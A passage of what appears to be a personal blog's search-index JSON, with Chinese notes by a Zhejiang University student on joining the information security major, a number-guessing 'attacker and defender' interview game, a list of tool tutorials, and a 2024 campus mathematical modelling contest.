\u4e13\u4e1a\u5206\u6d41","text":"<p>\u6211\u7684\u9ad8\u8003\u5f55\u53d6\u5fd7\u613f\u4e3a\u201c\u5de5\u79d1\u8bd5\u9a8c\u73ed\uff08\u4fe1\u606f\uff09\u201d\uff0c\u7b80\u79f0\u4e3a \u5de5\u4fe1\uff0c\u4e13\u4e1a\u5206\u6d41\u5728\u5f00\u5b66\u540e\u768410 \u6708\u4e2d\u65ec\u5230 11 \u6708\u8fdb\u884c\uff0c\u6211\u5728\u5206\u6d41\u4e2d\u8fdb\u5165\u4e86\u4fe1\u606f\u5b89\u5168\uff0c\u6545\u4e3a\u975e\u56fe\u7075\u73ed\u3002\u5f53\u7136\uff0c24 \u7ea7\u5f00\u59cb\u56fe\u7075\u73ed\u6ca1\u6709\u4fe1\u5b89\u4e86\u3002</p> <p>\u5728\u8ba1\u7b97\u673a\u5b66\u9662\u7684\u56db\u9879\u4e13\u4e1a\u4e2d\uff1a\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u6280\u672f\uff08\u8ba1\u79d1\uff0cCS\uff09\u3001\u8f6f\u4ef6\u5de5\u7a0b\uff08\u8f6f\u5de5\uff0cSE\uff09\u3001\u4fe1\u606f\u5b89\u5168\uff08\u4fe1\u5b89\uff0cIS\uff09\u3001\u5de5\u4e1a\u8bbe\u8ba1\uff08\u5de5\u8bbe\uff0cID\uff09</p> <p>\u76f8\u6bd4\u4e8e\u4e0a\u4e00\u5c4a\uff0c\u6211\u4eec\u8fd9\u4e00\u5c4a\u591a\u4e86\u4e00\u4e2a\u7a0b\u5e8f\u2014\u2014\u4e0a\u673a\u8003\u8bd5\uff0c\u5176\u5185\u5bb9\u4e3a\uff1a \u7ebf\u6027\u4ee3\u6570\u3001\u5fae\u79ef\u5206\u3001C \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1 \uff08\u5927\u81f4\u662f 3:3:4 \u5206\u6570\u6bd4\uff0c\u8bb0\u4e0d\u6e05\u4e86\uff0c\u5982\u6709\u9519\u8bef\uff0c\u656c\u8bf7\u6307\u51fa\uff09\uff0c\u8003\u6838\u8303\u56f4\u4e3a\u5f53\u65f6\u6240\u5b66\u5185\u5bb9\uff08\u8fdb\u5ea6\u5dee\u4e0d\u591a\uff0c\u7565\u6709\u5feb\u6162\uff09\u3002\u5177\u4f53\u673a\u8003\u5728\u4e13\u4e1a\u5206\u6d41\u4e2d\u5360\u6bd4\u591a\u5c11\u4e0d\u6e05\u695a\uff0c\u5b66\u6821\u7684\u7ed9\u7684\u901a\u77e5\u4e2d\u53ea\u662f\u6307\u51fa\u201c\u673a\u8003\u6210\u7ee9\u4f5c\u4e3a\u9762\u8bd5\u8bc4\u5206\u7684\u91cd\u8981\u53c2\u8003\u4f9d\u636e\uff08\u5de5\u4e1a\u8bbe\u8ba1\u4e13\u4e1a\u9664\u5916\uff09\u201d\u3002</p> <p>\u6700\u4e3a\u91cd\u5934\u7684\u5f53\u7136\u662f\u9762\u8bd5\u8868\u73b0\u548c\u9ad8\u8003\u76f8\u5bf9\u6210\u7ee9 <sup>1</sup> \uff0c\u4e0d\u8fc7\u4eca\u5e74\u5c45\u7136\u5728\u519b\u8bad\u524d\u540e\u5c31\u6709\u4e00\u6b21\u6570\u5b66\u4e0e\u8ba1\u7b97\u673a\u80fd\u529b\u6d4b\u8bd5\uff0c\u6682\u4e0d\u6e05\u695a\u5176\u7528\u5904\uff0c\u4e0d\u52a0\u8ba8\u8bba\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#iii2","title":"III.2 \u9009\u62e9\u4fe1\u5b89","text":"<p>\u4e3a\u4ec0\u4e48\u9009\u62e9\u4fe1\u5b89\uff1f\u5c31\u50cf\u5404\u4f4d\u9009\u62e9\u5927\u5b66\u4e00\u6837\uff0c\u539f\u56e0\u662f\u590d\u6742\u7684\uff1a</p> <ul> <li>\u5206\u6d41\u65f6\uff0c\u4fe1\u5b89\u7ade\u4e89\u538b\u529b\u5c0f\ud83e\udd2a<ul> <li>\u76f8\u5f53\u4e00\u90e8\u5206\u5de5\u4fe1\u4eba\u90fd\u8ba4\u4e3a CS \u5728\u5de5\u4fe1\u4e2d\u6700\u68d2\uff0c\u5206\u6d41\u65f6\u5176\u62a5\u5f55\u6bd4\u51e0\u4e4e\u8fbe\u5230\u4e86 2:1\u3002\u4e8b\u5b9e\u4e5f\u786e\u5b9e\u662f CS \u5b66\u4e60\u5185\u5bb9\u5145\u5b9e\u3001\u538b\u529b\u5927\u3001\u672a\u6765\u5e73\u5747\u5c31\u4e1a\u60c5\u51b5\u597d\u3001\u5de5\u8d44\u9ad8\uff1b\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u4fe1\u5b89 1.5:1 \u7684\u62a5\u5f55\u6bd4\u4f3c\u4e4e\u6ca1\u90a3\u4e48\u5413\u4eba\u3002</li> </ul> </li> <li>98 \u4e00\u4e9b\u5206\u6790\u6587\u7ae0\u7684\u5f71\u54cd\uff08\u9700\u8981 ZJU \u5185\u90e8\u7f51\u7edc\uff09\ud83e\uddd0<ul> <li>\u56de\u987e\u5728\u8ba1\u9662-\u4fe1\u5b89\u7684\u4e09\u5e74<ul> <li>\u6765\u81ea 19 \u7ea7\u4fe1\u5b89\u672c\u79d1\u751f xyx</li> </ul> </li> <li>\u5173\u4e8e\u6211\u5728\u56fe\u7075\u4fe1\u5b89\u7684\u8fd9\u4e09\u5e74<ul> <li>\u6765\u81ea 20 \u7ea7\u56fe\u7075\u4fe1\u5b89\u672c\u79d1\u751f wyh</li> </ul> </li> <li>\u8ba1\u9662\u4fe1\u606f\u5b89\u5168\u4e4b\u5c31\u8bfb\u521d\u4f53\u9a8c <ul> <li>\u6765\u81ea 22 \u7ea7\u4fe1\u5b89\u672c\u79d1\u751f</li> </ul> </li> </ul> </li> <li>\u89c9\u5f97\u81ea\u5df1\u8fdb\u4e0d\u4e86\u8ba1\u79d1\ud83d\ude05\uff08\u9003\uff09<ul> <li>\u867d\u7136\u4f46\u662f\uff0c\u6709\u4e00\u90e8\u5206\u7b2c\u4e00\u5fd7\u613f\u4e3a\u4fe1\u5b89\u7684\u4eba\u786e\u5b9e\u4e5f\u662f\u548c\u6211\u4e00\u6837\u8fd9\u4e48\u60f3\u7684\uff0c\u56e0\u4e3a\u5927\u90e8\u5206\u6240\u8c13\u7684\u201c\u70ed\u95e8\u4e13\u4e1a\u201d\u5728\u7b2c\u4e00\u5fd7\u613f\u80af\u5b9a\u662f\u4f1a\u7206\u6ee1\u7684\uff1b</li> <li>\u53ef\u80fd\u786e\u5b9e\u662f\u88ab\u5927\u91cf\u7684\u7ade\u4e89\u8005\u5413\u8dd1\u4e86\u5427\u3002</li> </ul> </li> </ul>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#iii3","title":"III.3 \u5c31\u8bfb\u4f53\u9a8c","text":"<p>\u51c6\u786e\u6765\u8bf4\uff0c\u6211\u53ea\u5f53\u4e86\u534a\u5e74\u7684\u4fe1\u5b89\u4eba\uff0c\u4f46\u662f\u4e5f\u662f\u90e8\u5206\u5730\u4f53\u4f1a\u5230\u4e86\u524d\u4eba\u7ecf\u9a8c\u8d34\u4e2d\u7684\u4e00\u4e9b\u9178\u751c\u82e6\u8fa3\uff1b\u4f46\u662f\u6839\u636e\u5b66\u957f\u5b66\u59d0\u7684\u53cd\u6620\uff0c\u201c\u4f60\u4eec\u4fe1\u5b89\u5c0f\u767b\u5403\u7684\u771f\u597d\u554a\u201d\uff0c\u5927\u6982\u4e5f\u662f\u6709\u201c\u54ce\uff0c\u6211\u4eec\u90a3\u4e2a\u65f6\u5019\u2026\u2026\u201d\u7684\u611f\u89c9\u4e86\uff08\u3405\uff09\u3002</p> <p>\u5047\u8bbe\u6211\u5c06\u8bfe\u7a0b\u6309\u4e09\u7c7b\u8fdb\u884c\u5927\u81f4\u5212\u5206\uff1a\uff08\u4e0d\u8bba\u7ed9\u5206\uff0c\u4e3b\u8981\u4f9d\u636e\u5b66\u4e60\u4f53\u9a8c\u548c\u4e2a\u4eba\u6536\u83b7\u6765\u770b\uff09</p> <ul> <li>\u786c \u2014\u2014 \u8bfe\u7a0b\u5185\u5bb9\u5145\u8db3\u6709\u610f\u4e49\uff0c\u4f46\u662f\u8981\u60f3\u4e0d\u9519\u7684\u6210\u7ee9\u5f88\u7d2f\uff1b</li> <li>\u6c34 \u2014\u2014 \u8bfe\u7a0b\u6210\u7ee9\u548c\u4f60\u6295\u5165\u7cbe\u529b\u5173\u7cfb\u4e0d\u592a\u5927\uff0c\u8bb2\u7a76\u201c\u6280\u5de7\u201d\uff1b</li> <li>\u53f2 \u2014\u2014 \u8bfe\u7a0b\u8981\u6c42\u5185\u5bb9\u5b9e\u9645\u610f\u4e49\u8f83\u5c0f/\u8bfe\u7a0b\u5185\u5bb9\u9648\u65e7\uff0c\u4e14\u201c\u6ca1\u6709\u8fc7\u591a\u6280\u5de7\u53ef\u8a00\u201d\u3002</li> </ul> <p>\u90a3\u4e48\u5927\u4e00\u6625\u590f\u4fe1\u5b89\u7684\u8bfe\u5927\u591a\u6570\u786e\u5b9e\u662f\u786c\uff1b\u8ba1\u7b97\u673a\u7cfb\u7edf I + \u6570\u636e\u7ed3\u6784\u57fa\u7840 + \u5fae\u79ef\u5206\u7532\uff08II\uff09\u7684\u8f6e\u756a\u4f5c\u4e1a\u8f70\u70b8\u4e0b\uff0c\u51ac\u5b66\u671f\u5468\u672b\u51e0\u4e4e\u662f\u6ca1\u6709\u7684\u3002\u5f88\u591a\u65f6\u5019\uff0c\u71ac\u591c\u4f3c\u4e4e\u662f\u552f\u4e00\u7684\u9009\u62e9\uff1b\u56e0\u4e3a\u5728\u5927\u5b66\u751f\u7684\u666e\u904d\u4f5c\u606f\u4e0b\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u65e9\u4e0a 6 \u70b9\u8d77\u6765\u5e72\u6d3b\uff08\u56e0\u4e3a\u4f60\u4f1a\u53d1\u73b0\u5f88\u53ef\u80fd\u5c31\u5957\u4e0a\u4e86\u201c\u5377\u201d\u7684\u5e3d\u5b50\u4e86\uff0c\u660e\u660e\u5f88\u665a\u7761\u4e5f\u662f\u5728\u5b8c\u6210\u4f5c\u4e1a\uff09\uff1b\u5f88\u591a\u65f6\u5019\uff0c\u591c\u665a 2 \u70b9\u4f9d\u65e7\u6709\u4eba\u6d3b\u8dc3\u7740\uff1b\u5728\u4e00\u6b21\u804a\u5929\u4e2d\uff0c\u4e5f\u5c31\u6709\u4e86\u201c\u8c01\u80fd\u5377\u8fc7\u4f60\u4eec\u4fe1\u5b89\u7684\u5440\u201d\u753b\u9762\u2026\u2026</p> <p>\u4e00\u8a00\u4ee5\u853d\u4e4b\uff0c\u6211\u8ba4\u4e3a\u5728\u4fe1\u5b89\u786e\u5b9e\u80fd\u591f\u5b66\u5230\u4e1c\u897f\uff0c\u4f46\u662f\u786e\u5b9e\u4f1a\u5f88\u7d2f\uff1b\u670b\u53cb\u5708\u4e0d\u65f6\u4f20\u6765\u60b2\u9e23\uff0c\u90a3\u662f\u6211\u548c\u6211\u7684\u540c\u5b66\ud83d\udca6\u3002</p> <p>\u7ecf\u5e38\u6027\u5730\uff0c\u6211\u53ef\u80fd\u542c\u5230\u67d0\u4e00\u4e2a\u540c\u5b66\u8bf4 xxx \u771f\u662f\u53f2\u8bfe\uff0c\u800c\u53e6\u4e00\u4f4d\u540c\u5b66\u8bf4 xxx \u76f8\u6bd4 yyy \u597d\u591a\u4e86 <sup>2</sup>\u3002\u6709\u65f6\u5019\u4e0a\u4e00\u4e9b\u8bfe\u786e\u5b9e\u662f\u50cf\u5728\u5403\u53f2\uff08\u5373\u4f7f\u8c10\u97f3\uff0c\u4e5f\u662f\u9648\u65e7\uff09\uff0c\u4f46\u662f\u4e5f\u8bb8\u4fe1\u5b89\u6bd4\u8f83\u65b0\u5174\uff0c\u6ca1\u6709\u592a\u591a\u8001\u672c\uff0c\u6240\u4ee5\u603b\u4f53\u4e0a\u786e\u5b9e\u66f4\u597d\uff1f</p> <p>\u6211\u6ca1\u8ba4\u771f\u8bfb\u8fc7\u5176\u4ed6\u4e13\u4e1a\u8bfe\uff0c\u4e0d\u505a\u8bc4\u4ef7\uff0c\u8fd8\u8bf7\u7ed3\u5408\u591a\u65b9\u4fe1\u606f\u5224\u65ad\u3002</p> <p>\u5982\u679c\u95ee\u6211\u63a8\u4e0d\u63a8\u8350\u9009\u4fe1\u5b89\ud83e\udd14\uff0c\u613f\u5b66\u8005\u53ef\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#_2","title":"\u3010\u8865\u3011\u9762\u8bd5\u7ec6\u8282","text":"<p>\u3010\u53e0\u7532\u3011\u4e0b\u9762\u6211\u7684\u505a\u6cd5\u7eaf\u5c5e\u4e2a\u4eba\u60f3\u6cd5\uff0c\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u80fd\u591f\u6bcf\u6b21\u53d1\u6325\u4f5c\u7528\u3002</p> <p>\u9762\u8bd5\u5f00\u59cb\u7ed3\u675f\u6bd4\u8f83\u7ecf\u5178\u5427\u3002</p> <p>\u5f00\u5934 1-2 min \u81ea\u6211\u4ecb\u7ecd/\u9648\u8ff0\uff0c\u6211\u5f53\u65f6\u4e3b\u8981\u628a\u4e2a\u4eba\u7b80\u5386\u80cc\u4e86\u4e00\u904d\uff08\u56e0\u4e3a\u6ca1\u5565\u597d\u8bf4\u7684\uff09\uff1b\u7136\u540e\u597d\u50cf\u6709\u4e2a\u5c0f\u95ee\u9898\uff0c\u6211\u5728\u4e00\u8d77\u9762\u8bd5\u7684 6\u4eba\uff08\u5305\u62ec\u6211\u81ea\u5df1\uff09\u987a\u5e8f\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u6240\u4ee5\u662f\u5148\u7cbe\u7b80\u5730\u6982\u62ec\u524d\u9762\u4eba\u6211\u8ba4\u540c\u7684\u89c2\u70b9\uff08\u6c34\u957f\u5ea6\uff09\uff0c\u518d\u52a0\u4e00\u4e9b\u81ea\u5df1\u7684\u60f3\u6cd5\u3002</p> <p>\u7ed3\u675f\u7684\u65f6\u5019\u95ee\u4e2a\u4eba\u7684\u672a\u6765\u89c4\u5212\uff0c\u5982\u56fd\u5185\u8bfb\u7814/\u5de5\u4f5c/\u51fa\u56fd\u3002</p> <p>\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\u4e2d\u95f4\u7684\u6e38\u620f\u3002\uff08\u4e0b\u9762\u5177\u4f53\u6570\u5b57\u53ef\u80fd\u6709\u8bef\uff09</p> <p>\u901a\u8fc7\u62bd\u7b7e\u51b3\u5b9a\u8eab\u4efd\uff0c2 \u4eba\u4e3a\u653b\u51fb\u8005\uff0c4 \u4eba\u4e3a\u9632\u5b88\u8005<sup>3</sup>\u3002\u9632\u5b88\u8005\u7684\u8eab\u4efd\u724c\u4e0a\u6709\u4e00\u4e2a\u6570\u5b57\uff0c\u4e24\u4e2a\u4eba\u662f\u76f8\u540c\u7684\uff08\u5373\u6709\u4e24\u4e2a\u4eba\u662f a\uff0c\u4e24\u4e2a\u4eba\u662f b\uff09\uff1b\u653b\u51fb\u8005\u8eab\u4efd\u724c\u4e0a\u6ca1\u6709\u3002\u6240\u6709\u4eba\u90fd\u77e5\u9053\uff0c0 &lt; a &lt; b &lt; 1000 \uff0c\u4e14\u9632\u5b88\u8005\u53ea\u77e5\u9053\u81ea\u5df1\u7684\u8eab\u4efd\u724c\u4e0a\u7684\u6570\u5b57\uff0c\u4e0d\u77e5\u9053\u8c01\u662f\u961f\u53cb\uff0ca/b \u53ea\u77e5\u9053\u81ea\u5df1\u624b\u91cc\u7684\u90a3\u4e2a\uff0c\u653b\u51fb\u8005\u540c\u6837\u4e0d\u77e5\u9053\u961f\u53cb\u3002\u8eab\u4efd\u724c\u770b\u5b8c\u6536\u56de\u3002</p> <p>\u6e38\u620f\u65f6\u95f4 15min\uff08\u5927\u6982\uff09\uff0c\u5728\u65f6\u95f4\u7ed3\u675f\u65f6\uff0c\u7ed9\u51fa\u81ea\u5df1\u7684\u7ed3\u679c\u3002\u9632\u5b88\u8005\u7684\u4efb\u52a1\u662f\u5224\u65ad\u81ea\u5df1\u662f\u8f83\u5927\u8005\u8fd8\u662f\u8f83\u5c0f\u8005\uff1b\u653b\u51fb\u8005\u7684\u4efb\u52a1\u662f\u731c\u51fa a/b\uff0c\u5141\u8bb8\u8303\u56f4\u4e3a [a-1, a+1] + [b-1, b+1] \uff08\u8fd8\u662f 2 \u6765\u7740\uff1f\u4e0d\u91cd\u8981\uff09\uff1b\u53ef\u4ee5\u201c\u79c1\u804a\u201d\u3002</p> <p>\u5728\u542c\u5230\u89c4\u5219\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u5f53\u65f6\u6211\u5df2\u7ecf\u8ba4\u4e3a\u9632\u5b88\u8005\u8fbe\u5230\u76ee\u6807\u66f4\u52a0\u7b80\u5355\u3002</p> <p>\u56e0\u4e3a\u9632\u5b88\u8005\u5c06\u81ea\u5df1\u7684\u6570\u5b57\u52a0\u51cf\u4e00\u4e2a\uff08\u5fc3\u91cc\u968f\u673a\u60f3\u4e00\u4e2a\uff090 \u6216 1\uff1b\u518d\u653e\u5927 1000 -1010 \u500d\uff0c\u516c\u5e03\u51fa\u6765\uff0c\u8fd8\u662f\u6bd4\u8f83\u597d\u6bd4\u8f83\u7684\u3002\u4f8b\u5982 a/b \u5728 500 \u9644\u8fd1\u7684\u8bdd\uff0c550*1000/1010 = 547\uff0c\u8fd9\u5df2\u7ecf\u76f8\u5dee 3 \u5de6\u53f3\u4e86\uff0c\u4f55\u51b5\u4e0d\u77e5\u9053\u662f\u5426\u653e\u5927/\u7f29\u5c0f\u4e86\u4e00\u4f4d\uff0c\u653b\u51fb\u8005\u76f4\u63a5\u53cd\u63a8\u98ce\u9669\u5f88\u5927\uff1b\u800c\u9632\u5b88\u8005\u53ea\u8981\u76f8\u5dee\u5927\u4e8e 1\uff0c\u5927\u5c0f\u5173\u7cfb\u4e0d\u4f1a\u53d8\uff08\u4e14\u5728 1/4 \u7684\u6982\u7387\u4e0b\u624d\u9760\u8fd1\u5373\u4f7f\u5c31\u4e3a 1\uff0c\u4e5f\u662f\u7ea6 1/4 \u6982\u7387\u4ea4\u6362\u5927\u5c0f\u5173\u7cfb\uff09\uff0c\u54ea\u6015\u662f\u771f\u6b63\u9760\u8fd1\u4e86\uff0c\u57fa\u4e8e\u4e24\u6570\u76f8\u52a0\u4e3a\u5b9a\u503c\u65f6\uff0c\u9760\u7684\u8d8a\u8fd1\u7684\u56e0\u6570\u76f8\u4e58\u5f97\u79ef\u8d8a\u5927\uff0c\u8f83\u5927\u7684\u6570\u4e58\u4ee5\u4e00\u4e2a\u7684\u6570\u66f4\u5927\u7684\u53ef\u80fd\u6027\u4e5f\u5c31\u8d8a\u5927\uff0c\u4f9d\u65e7\u6709\u4e00\u534a\u4ee5\u4e0a\u7684\u53ef\u80fd\u6027\u5224\u65ad\u6b63\u786e\u3002\u6b64\u5916\uff0c\u4f60\u662f 4 \u4e2a\u4eba\uff0c\u8fd9\u6837\u4e0b\u6765\u603b\u8be5\u6709\u4e00\u4e24\u4e2a\u4eba\u6b63\u786e\u7684\u3002\u80dc\u5229\u8005\u4e0d\u4e00\u5b9a\u5206\u6570\u597d\uff0c\u9762\u8bd5\u5b98\u8fd8\u8981\u770b\u4f60\u7684\u8868\u73b0\uff1b\u4f60\u80fd\u591f\u63d0\u51fa\u4e00\u4e2a\u8ba9\u653b\u51fb\u8005\u5931\u8d25\u6982\u7387\u6781\u9ad8\uff0c\u800c\u53cb\u65b9\u901a\u8fc7\u7387\u9ad8\u7684\u65b9\u6848\uff0c\u54ea\u6015\u6700\u540e\u4f60\u5931\u8d25\u4e86\uff0c\u4e5f\u662f\u5f88\u52a0\u5206\u7684\u3002</p> <p>\u4f46\u662f\uff0c\u90a3 1/3 \u7684\u6982\u7387\u5c31\u7ed9\u6211\u9009\u5230\u4e86\uff0c\u8fd9\u6211\u6ca1\u8f99\u4e86\uff0c\u80fd\u505a\u7684\u66f4\u591a\u662f\u5e72\u6270\u4ed6\u4eec\u7684\u8ba8\u8bba\u3002</p> <p>\u4ed6\u4eec\u63d0\u51fa\u4e86\u4e8c\u5206\u6cd5\uff0c\u6bd4\u5982\u81ea\u5df1\u7684\u6570\u5b57 \uff08\u5927\u4e8e/\u5c0f\u4e8e\uff09\u67d0\u4e2a\u9608\u503c\uff1b\u6211\u5c31\u5411\u7740\u6709\u524d\u9762\u7684\u4eba\u63d0\u51fa\u7684\u4e00\u8fb9\u9760\uff1b\u59cb\u7ec8\u6709\u4e24\u4e2a\u4eba\u201c\u4f50\u8bc1\u201d\uff0c\u65e0\u6cd5\u5224\u65ad\u6211\u662f\u5426\u4e3a\u653b\u51fb\u8005\u3002\u4ed6\u4eec\u60f3\u5230\u4e86\u6211\u4e0a\u9762\u7684\u601d\u8def\uff0c\u4f46\u662f\u5bf9\u4e8e\u653e\u5927\u500d\u7387\u533a\u95f4\u6ca1\u6709\u8003\u8651\u597d\uff0c\u57fa\u4e8e[5-10]\uff1b\u6211\u76f4\u63a5\u6253\u65ad\u5176\u53d1\u8a00<sup>4</sup>\uff0c\u201c\u90a3\u653b\u51fb\u8005\u9664\u56de\u6765\u4e0d\u5c31\u597d\u4e86\u201d\uff0cta \u4e5f\u6ca1\u518d\u601d\u8003\u8fd9\u4e2a\u65b9\u6848\u3002</p> <p>\u5f53\u7136\uff0c\u4e0d\u77e5\u9053\u961f\u53cb\u662f\u8c01\uff0c\u6211\u4e5f\u4e0d\u8bb0\u5f97 ta \u7684\u8868\u73b0\u4e86\u3002\u603b\u4e4b\u6211\u4eec\u6ca1\u80fd\u591f\u5f88\u597d\u5730\u622a\u53d6\u4fe1\u606f\uff0c\u731c\u6d4b\u5728[510-540]\u4e4b\u95f4\uff0c\u4ed6\u4eec\u4e5f\u5b8c\u5168\u6ca1\u4ea4\u6d41\u51fa\u7ed3\u679c\u3002\u6700\u540e\u9632\u5b88\u65b9\u65e0\u4e00\u7b54\u5bf9\uff08\u5176\u5b9e\u6211\u4e5f\u532a\u5937\u6240\u601d\uff0c\u7406\u5e94\u80fd\u591f\u8499\u5bf9\u4e00\u4e24\u4e2a\uff09\uff1b\u6211\u8499\u4e86\u4e2a 525\u3002\u7ed3\u679c\u662f\uff08522\uff0c524\uff09\uff0c\u6211\u60ca\u9669\u5730\u8e29\u7ebf\uff1b\u6211\u7684\u961f\u53cb\u8fd0\u6c14\u6bd4\u6211\u5dee\u4e9b\u3002</p> <p>\u4e8b\u540e\u624d\u53d1\u73b0\uff0c\u6709\u4e00\u4e2a 522 \u7684\u4eba\u8bb0\u6210\u81ea\u5df1\u662f 528 \u4e86 \ud83d\ude05\uff0c\u5bfc\u81f4\u4e24\u4e2a 524 \u90fd\u8ba4\u4e3a\u81ea\u5df1\u5c0f\u4e86\uff0c\u4ed6\u81ea\u5df1\u5219\u8ba4\u4e3a\u81ea\u5df1\u66f4\u5927\uff0c\u7b2c\u56db\u4eba\u539f\u56e0\u672a\u77e5\u3002</p> <ol> <li> <p>\u5f53\u65f6\u4e3a\uff1a\u9ad8\u8003\u76f8\u5bf9\u6210\u7ee9=\u5b66\u751f\u9ad8\u8003\u6210\u7ee9/\u751f\u6e90\u5730\u7701\u5e02\u5f55\u53d6\u5de5\u4fe1\u5927\u7c7b\u9ad8\u8003\u6210\u7ee9\u6700\u9ad8\u5206\u00d7100\uff0c\u5360\u6bd4\u56e0\u4e0d\u540c\u5b66\u9662/\u4e13\u4e1a\u800c\u5f02\uff1b\u8bf7\u4ee5\u6700\u65b0\u6d88\u606f\u4e3a\u51c6\u3002\u00a0\u21a9</p> </li> <li> <p>xxx \u662f\u672c\u4e13\u4e1a\u8bfe\uff0c\u800c yyy \u5f80\u5f80\u662f\u5176\u4ed6\u4e13\u4e1a\u7684\u7c7b\u4f3c\u8bfe\u3002\u00a0\u21a9</p> </li> <li> <p>\u4e5f\u8bb8\u5f53\u65f6\u4e0d\u662f\u8fd9\u4e48\u53eb\u7684\uff1f\u65e0\u6240\u8c13\u4e86\u00a0\u21a9</p> </li> <li> <p>\u5f53\u7136\u4e0d\u592a\u793c\u8c8c\uff0c\u4f46\u6211\u90fd\u662f\u653b\u51fb\u8005\u4e86\u8fd8\u8981\u4ec0\u4e48\u793c\u8c8c\u3002\u00a0\u21a9</p> </li> </ol>","tags":["summary"]},{"location":"tutorial/","title":"Toturial","text":"<p>\u8fd9\u91cc\u662f\u81ea\u5df1\u7684\u4e00\u4e9b\u6280\u80fd\u5b66\u4e60\u7b14\u8bb0/\u5de5\u5177\uff0c\u6bd4\u8f83\u6742\uff0c\u5b66\u5230\u54ea\u5199\u5230\u54ea\u5427\u3002</p> Begin          <ul> <li> Obsidian_begin  4736  79  17 mins              1740043260 </li> <li> Mkdocs_begin  1494  164  7 mins              1740043260 </li> <li> Typst_begin  1156  18  4 mins              1740043260 </li> <li> Utools_begin  735  2 mins              1740043260 </li> <li> chrome_begin  455  2 mins              1740043260 </li> <li> logisim_begin  1027  3  3 mins              1740043260 </li> <li> Python_begin  1446  1  5 mins              1740043260 </li> </ul> MIT          <ul> <li> 2_learn-to-use-Vim-editor  3007  10 mins              1739718485 </li> <li> 0_linux-shell  3258  105  12 mins              1739624158 </li> <li> 1_shell-script-and-basic-tools  4167  65  15 mins              1739624158 </li> <li> 3_Git  2841  9 mins              1739624158 </li> <li> 4_base-of-web  3132  1  10 mins              1739624158 </li> <li> 5_Emmet  798  15  3 mins              1739624158 </li> </ul> python_learn          <ul> <li> crypto  108  0 mins              1739776217 </li> <li> data  11  0 mins              1739718485 </li> </ul>","tags":["notes"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/2024%20%E5%B9%B4%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B/","title":"2024 \u5e74\u6d59\u6c5f\u5927\u5b66\u5927\u5b66\u751f\u6570\u5b66\u5efa\u6a21\u7ade\u8d5b","text":"<p>\u53c2\u52a0\u7684\u7b2c\u4e00\u6b21\u6570\u5b66\u5efa\u6a21\u6bd4\u8d5b\uff0c\u6211\u548c\u961f\u53cb\u90fd\u6beb\u65e0\u7ecf\u9a8c\uff0c\u6743\u5f53\u4f53\u9a8c\u4e00\u6b21<sup>1</sup>\u3002</p> <p>\u62a5\u540d\u7f51\u7ad9 \uff1b\u5f53\u65f6\u9009\u62e9\u4e86 B \u9898\u3002</p>","tags":["blog"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/2024%20%E5%B9%B4%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B/#_1","title":"\u9898\u9762","text":"","tags":["blog"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/2024%20%E5%B9%B4%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B/#_2","title":"\u8d44\u6599\u94fe\u63a5","text":"<ul> <li>\u51fa\u9898\u539f\u578b</li> <li>\u539f\u578b\u62db\u6807\u7ed3\u679c</li> <li>\u535a\u5f08\u8bba\u5728\u6295\u6807\u62a5\u4ef7\u51b3\u7b56\u4e2d\u7684\u5e94\u7528</li> </ul>","tags":["blog"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/2024%20%E5%B9%B4%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B/#_3","title":"\u5176\u4ed6","text":"<p>\u4e00\u4e9b\u53ef\u80fd\u9700\u8981\u8003\u8651\u7684\u7ec6\u8282\uff1f\uff1a</p> <ul> <li>\u5176\u4ed6\u6295\u6807\u4eba\u7684\u6295\u6807\u8bc4\u5ba1\u4ef7\u4e0d\u786e\u5b9a\u4e0d\u7b49\u540c\u4e8e\u968f\u673a\u5206\u5e03\uff0c\u53ef\u80fd\u9700\u8981\u5b9e\u884c\u673a\u5668\u5b66\u4e60\uff1f</li> <li>\u5f53\u65f6\u9879\u76ee\u884c\u60c5\u5bf9\u4e8e\u6295\u6807\u4eba\u7684\u51b3\u7b56\u5f71\u54cd</li> </ul>","tags":["blog"]},{"location":"tutorial/MCM%EF%BC%88%E6%95%B0%E6%A8%A1%EF%BC%89/2024%20%E5%B9%B4%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B/#_4","title":"\u7ed3\u679c","text":"<p>\u63d0\u4ea4\u8bba\u6587\uff08\u65e0\u5c01\u9762\uff09\uff0c\u6700\u540e\u4fa5\u5e78\u83b7\u5f97\u6821\u4e09\u7b49\u5956\u3002</p> 